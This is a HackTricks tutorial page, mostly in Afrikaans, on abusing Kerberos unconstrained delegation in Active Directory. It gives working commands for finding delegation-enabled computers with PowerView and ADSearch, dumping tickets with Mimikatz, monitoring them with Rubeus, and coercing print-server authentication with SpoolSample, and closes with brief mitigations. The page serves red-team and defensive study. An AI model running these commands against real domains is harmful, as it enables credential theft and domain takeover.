# Unconstrained Delegation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Unconstrained delegation

Dit is 'n kenmerk wat 'n Domein Administrateur kan stel op enige **Rekenaar** binne die domein. Dan, wanneer 'n **gebruiker aanmeld** op die Rekenaar, sal 'n **kopie van die TGT** van daardie gebruiker **binne die TGS** wat deur die DC **gestuur word en in geheue in LSASS gestoor word**. So, as jy Administrateur regte op die masjien het, sal jy in staat wees om die **kaartjies te dump en die gebruikers te verpersoonlik** op enige masjien.

So as 'n domein admin aanmeld op 'n Rekenaar met die "Unconstrained Delegation" kenmerk geaktiveer, en jy het plaaslike admin regte op daardie masjien, sal jy in staat wees om die kaartjie te dump en die Domein Admin enige plek te verpersoonlik (domein privesc).

Jy kan **Rekenaar objek met hierdie attribuut vind** deur te kyk of die [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) attribuut [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx) bevat. Jy kan dit doen met 'n LDAP filter van ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, wat is wat powerview doen:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Laai die kaartjie van die Administrateur (of slagoffer gebruiker) in geheue met **Mimikatz** of **Rubeus vir 'n** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Meer inligting: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Meer inligting oor Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

As 'n aanvaller in staat is om 'n **rekenaar wat toegelaat word vir "Unconstrained Delegation"** te **kompromitteer**, kan hy 'n **Druk bediener** **mislei** om **outomaties aan te meld** teen dit **en 'n TGT in die geheue van die bediener te stoor**.\
Dan kan die aanvaller 'n **Pass the Ticket aanval uitvoer om** die gebruiker se Druk bediener rekenaarrekening te verpersoonlik.

Om 'n druk bediener teen enige masjien aan te meld, kan jy [**SpoolSample**](https://github.com/leechristensen/SpoolSample) gebruik:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
If the TGT if from a domain controller, you could perform a[ **DCSync attack**](acl-persistence-abuse/#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Hier is ander maniere om te probeer om 'n outentisering te dwing:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigering

* Beperk DA/Admin aanmeldings tot spesifieke dienste
* Stel "Rekening is sensitief en kan nie gedelegeer word nie" vir bevoorregte rekeninge.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
